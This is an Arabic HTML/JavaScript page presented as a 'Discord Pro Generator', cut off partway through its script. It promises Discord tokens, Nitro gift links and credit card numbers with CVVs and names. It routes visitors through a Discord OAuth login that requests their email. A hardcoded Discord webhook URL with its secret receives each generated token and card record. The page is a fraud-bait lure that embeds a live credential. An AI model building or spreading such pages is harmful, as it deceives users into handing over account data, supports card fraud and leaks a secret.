<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Pro - مولد الرموز المتقدم</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #4facfe 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        /* تأثيرات الخلفية المتحركة */
        .background-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        
        .floating-shapes {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: float 8s ease-in-out infinite;
        }
        
        .floating-shapes:nth-child(1) { 
            width: 80px; height: 80px; 
            top: 10%; left: 20%; 
            animation-delay: 0s; 
        }
        .floating-shapes:nth-child(2) { 
            width: 120px; height: 120px; 
            top: 20%; left: 80%; 
            animation-delay: 2s; 
        }
        .floating-shapes:nth-child(3) { 
            width: 100px; height: 100px; 
            top: 80%; left: 10%; 
            animation-delay: 4s; 
        }
        .floating-shapes:nth-child(4) { 
            width: 60px; height: 60px; 
            top: 70%; left: 70%; 
            animation-delay: 1s; 
        }
        .floating-shapes:nth-child(5) { 
            width: 90px; height: 90px; 
            top: 50%; left: 50%; 
            animation-delay: 3s; 
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg) scale(1); }
            25% { transform: translateY(-30px) rotate(90deg) scale(1.1); }
            50% { transform: translateY(-20px) rotate(180deg) scale(0.9); }
            75% { transform: translateY(-40px) rotate(270deg) scale(1.2); }
        }
        
        .main-container {
            background: rgba(30, 30, 30, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
            width: 100%;
            max-width: 600px;
            position: relative;
            z-index: 1;
            border: 2px solid rgba(255, 255, 255, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #5865f2, #7289da, #ff6b6b);
            padding: 30px;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
            opacity: 0.3;
        }
        
        .logo {
            font-size: 32px;
            font-weight: 900;
            color: white;
            margin-bottom: 10px;
            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 1;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 16px;
            position: relative;
            z-index: 1;
        }
        
        .content {
            padding: 40px;
        }
        
        .tab-navigation {
            display: flex;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 5px;
            margin-bottom: 30px;
            gap: 5px;
        }
        
        .tab-btn {
            flex: 1;
            padding: 12px 20px;
            background: transparent;
            color: rgba(255, 255, 255, 0.6);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            font-size: 14px;
        }
        
        .tab-btn.active {
            background: linear-gradient(135deg, #5865f2, #7289da);
            color: white;
            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        
        .section:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
            border-color: rgba(88, 101, 242, 0.3);
        }
        
        .section-title {
            color: white;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .generator-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .generate-btn {
            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
            color: white;
            border: none;
            padding: 15px 20px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 14px;
            position: relative;
            overflow: hidden;
        }
        
        .generate-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .generate-btn:hover::before {
            left: 100%;
        }
        
        .generate-btn:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
        }
        
        .generate-btn.discord { background: linear-gradient(135deg, #5865f2, #7289da); }
        .generate-btn.nitro { background: linear-gradient(135deg, #ff73fa, #d946ef); }
        .generate-btn.gift { background: linear-gradient(135deg, #fbbf24, #f59e0b); }
        .generate-btn.visa { background: linear-gradient(135deg, #1e40af, #3b82f6); }
        .generate-btn.mastercard { background: linear-gradient(135deg, #dc2626, #ef4444); }
        .generate-btn.paypal { background: linear-gradient(135deg, #0070ba, #00457c); }
        
        .result-display {
            background: rgba(0, 0, 0, 0.3);
            border: 2px solid #5865f2;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            font-family: 'Courier New', monospace;
            color: #57f287;
            font-size: 16px;
            font-weight: bold;
            word-break: break-all;
            line-height: 1.5;
        }
        
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #5865f2;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .copy-btn:hover {
            background: #4752c4;
            transform: scale(1.05);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.08);
        }
        
        .stat-number {
            font-size: 28px;
            font-weight: 900;
            color: #57f287;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 600;
        }
        
        .discord-login-btn {
            width: 100%;
            padding: 18px 25px;
            background: linear-gradient(135deg, #5865f2, #7289da);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .discord-login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .discord-login-btn:hover::before {
            left: 100%;
        }
        
        .discord-login-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(88, 101, 242, 0.4);
        }
        
        .user-info {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            display: none;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .user-avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: block;
            border: 4px solid #5865f2;
            transition: all 0.3s ease;
        }
        
        .user-avatar:hover {
            transform: scale(1.1) rotate(5deg);
            box-shadow: 0 0 30px rgba(88, 101, 242, 0.5);
        }
        
        .user-name {
            color: white;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .user-email {
            color: rgba(255, 255, 255, 0.7);
            font-size: 16px;
            margin-bottom: 25px;
        }
        
        .logout-btn {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .logout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.4);
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            opacity: 0;
            transform: translateX(100%);
            transition: all 0.3s ease;
            z-index: 1000;
        }
        
        .notification.show {
            opacity: 1;
            transform: translateX(0);
        }
        
        .notification.success {
            background: linear-gradient(135deg, #10b981, #059669);
        }
        
        .notification.error {
            background: linear-gradient(135deg, #ef4444, #dc2626);
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top-color: #5865f2;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .card-details {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            padding: 15px;
            margin: 10px 0;
            border-left: 4px solid #5865f2;
        }
        
        .card-details h4 {
            color: #57f287;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .card-details p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 13px;
            margin: 3px 0;
        }
        
        @media (max-width: 768px) {
            .main-container {
                margin: 10px;
                border-radius: 20px;
            }
            
            .content {
                padding: 25px;
            }
            
            .generator-grid {
                grid-template-columns: 1fr 1fr;
            }
            
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .tab-btn {
                padding: 10px 15px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="background-animation">
        <div class="floating-shapes"></div>
        <div class="floating-shapes"></div>
        <div class="floating-shapes"></div>
        <div class="floating-shapes"></div>
        <div class="floating-shapes"></div>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <div class="main-container">
        <div class="header">
            <div class="logo">🚀 Discord Pro Generator</div>
            <div class="subtitle">مولد الرموز والبطاقات الاحترافي</div>
        </div>
        
        <div class="content">
            <div class="tab-navigation">
                <button class="tab-btn active" onclick="switchTab('discord')">Discord</button>
                <button class="tab-btn" onclick="switchTab('cards')">البطاقات</button>
                <button class="tab-btn" onclick="switchTab('stats')">الإحصائيات</button>
            </div>
            
            <!-- تبويب Discord -->
            <div class="tab-content active" id="discordTab">
                <div class="section" id="loginSection">
                    <div class="section-title">🔐 تسجيل الدخول</div>
                    <a href="https://discord.com/oauth2/authorize?client_id=1261839375738732684&response_type=code&redirect_uri=https%3A%2F%2Fkhaledali.vercel.app%2F&scope=identify+email" 
                       class="discord-login-btn">
                        🎯 تسجيل الدخول عبر Discord
                    </a>
                </div>
                
                <div class="user-info" id="userInfo">
                    <img class="user-avatar" id="userAvatar" alt="User Avatar">
                    <div class="user-name" id="userName"></div>
                    <div class="user-email" id="userEmail"></div>
                    <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
                </div>
                
                <div class="section">
                    <div class="section-title">🎮 مولد رموز Discord</div>
                    <div class="generator-grid">
                        <button class="generate-btn discord" onclick="generateToken('discord')">🔷 Discord</button>
                        <button class="generate-btn nitro" onclick="generateToken('nitro')">💎 Nitro</button>
                        <button class="generate-btn gift" onclick="generateToken('gift')">🎁 Gift</button>
                        <button class="generate-btn" onclick="generateToken('premium')">⭐ Premium</button>
                    </div>
                    <div class="result-display" id="discordResult">
                        اضغط على أي زر لإنشاء رمز Discord
                        <button class="copy-btn" id="discordCopyBtn" onclick="copyResult('discord')" style="display: none;">نسخ</button>
                    </div>
                </div>
            </div>
            
            <!-- تبويب البطاقات -->
            <div class="tab-content" id="cardsTab">
                <div class="section">
                    <div class="section-title">💳 مولد بطاقات الائتمان</div>
                    <div class="generator-grid">
                        <button class="generate-btn visa" onclick="generateCard('visa')">💳 Visa</button>
                        <button class="generate-btn mastercard" onclick="generateCard('mastercard')">🏦 MasterCard</button>
                        <button class="generate-btn paypal" onclick="generateCard('paypal')">💰 PayPal</button>
                        <button class="generate-btn" onclick="generateCard('amex')">💎 Amex</button>
                    </div>
                    <div class="result-display" id="cardResult">
                        اضغط على أي زر لإنشاء بطاقة
                        <button class="copy-btn" id="cardCopyBtn" onclick="copyResult('card')" style="display: none;">نسخ</button>
                    </div>
                    <div id="cardDetails"></div>
                </div>
            </div>
            
            <!-- تبويب الإحصائيات -->
            <div class="tab-content" id="statsTab">
                <div class="section">
                    <div class="section-title">📊 الإحصائيات</div>
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-number" id="discordCount">0</div>
                            <div class="stat-label">رموز Discord</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number" id="cardCount">0</div>
                            <div class="stat-label">بطاقات مُنشأة</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number" id="totalSent">0</div>
                            <div class="stat-label">إجمالي المُرسل</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number" id="todayCount">0</div>
                            <div class="stat-label">اليوم</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // المتغيرات العامة
        let stats = {
            discordTokens: 0,
            cards: 0,
            totalSent: 0,
            today: 0
        };
        
        let currentResults = {
            discord: '',
            card: ''
        };
        
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1385844749503561881/pZYFslVq1hw69sWVL40IhiPdViMqolHRUl_yCpjq36AaHqrO2Jry2OIGzKNWuOfhCCxc';
        
        // تبديل التبويبات
        function switchTab(tabName) {
            // إخفاء جميع التبويبات
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // إظهار التبويب المحدد
            document.getElementById(tabName + 'Tab').classList.add('active');
            event.target.classList.add('active');
        }
        
        // مولد رموز Discord
        function generateToken(type) {
            showLoading();
            
            setTimeout(() => {
                let token = '';
                let description = '';
                
                switch(type) {
                    case 'discord':
                        token = 'mfa.' + generateRandomString(84);
                        description = 'Discord Bot Token';
                        break;
                    case 'nitro':
                        token = generateNitroCode();
                        description = 'Discord Nitro Code';
                        break;
                    case 'gift':
                        token = generateGiftCode();
                        description = 'Discord Gift Code';
                        break;
                    case 'premium':
                        token = 'PREM-' + generateRandomString(16);
                        description = 'Discord Premium Code';
                        break;
                }
                
                currentResults.discord = token;
                
                document.getElementById('discordResult').innerHTML = 
                    `<strong>${token}</strong>
                     <button class="copy-btn" onclick="copyResult('discord')">نسخ</button>`;
                
                stats.discordTokens++;
                stats.totalSent++;
                stats.today++;
                updateStats();
                
                sendToWebhook({
                    type: 'discord_token',
                    token: token,
                    description: description,
                    category: type
                });
                
                hideLoading();
                showNotification('تم إنشاء رمز Discord بنجاح!', 'success');
            }, 1000);
        }
        
        // مولد بطاقات الائتمان
        function generateCard(type) {
            showLoading();
            
            setTimeout(() => {
                let cardData = generateCreditCard(type);
                currentResults.card = cardData.number;
                
                document.getElementById('cardResult').innerHTML = 
                    `<strong>${cardData.number}</strong>
                     <button class="copy-btn" onclick="copyResult('card')">نسخ</button>`;
                
                document.getElementById('cardDetails').innerHTML = `
                    <div class="card-details">
                        <h4>📋 تفاصيل البطاقة</h4>
                        <p><strong>النوع:</strong> ${cardData.type}</p>
                        <p><strong>الرقم:</strong> ${cardData.number}</p>
                        <p><strong>تاريخ الانتهاء:</strong> ${cardData.expiry}</p>
                        <p><strong>CVV:</strong> ${cardData.cvv}</p>
                        <p><strong>الاسم:</strong> ${cardData.name}</p>
                    </div>
                `;
                
                stats.cards++;
                stats.totalSent++;
                stats.today++;
                updateStats();
                
                sendToWebhook({
                    type: 'credit_card',
                    ...cardData,
                    category: type
                });
                
                hideLoading();
                showNotification('تم إنشاء بطاقة ائتمان بنجاح!', 'success');
            }, 1500);
        }
        
        // إنشاء رمز عشوائي
        function generateRandomString(length) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        // إنشاء رمز Nitro
        function generateNitroCode() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let code = 'https://discord.gift/';
            for (let i = 0; i < 16; i++) {
                code += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return code;
        }
        
        // إنشاء رمز هدية
        function generateGiftCode() {
            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            let code = 'GIFT-';
            for (let i = 0; i < 12; i++) {
                if (i > 0 && i % 4 === 0) code += '-';
                code += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return code;
        }
        
        // إنشاء بطاقة ائتمان
        function generateCreditCard(type) {
            const names = ['Ahmed Ali', 'Sara Mohammed', 'Omar Hassan', 'Fatima Ahmad', 'Khalid Ibrahim'];
            const currentYear = new Date().getFullYear();
            
            let prefix = '';
            let length = 16;
            let typeName = '';
            
            switch(type) {
                case 'visa':
                    prefix = '4';
                    typeName = 'Visa';
                    break;
                case 'mastercard':
